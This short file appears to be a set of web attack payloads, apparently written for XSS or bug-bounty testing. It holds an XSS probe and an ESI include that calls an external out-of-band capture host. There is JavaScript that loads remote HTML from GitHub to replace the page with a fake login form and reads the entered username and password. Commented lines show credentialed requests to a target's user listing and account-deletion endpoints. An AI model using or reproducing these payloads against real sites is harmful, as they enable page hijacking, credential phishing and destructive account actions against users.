prompt(1337);//
<esi:include src="http://xss.egynhlmt7zjzfb0t2vnciu24dvjm7b.oastify.com/capture" />
fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('#user').value
    let pass = document.querySelector('#pass').value
    alert('Login: ' + login + " password: " + pass);

    return;
  }, true);
})


// fetch("https://target/en/users", { "method": "POST", "credentials": "include"})


// fetch("https://target/en/user/settings/delete")
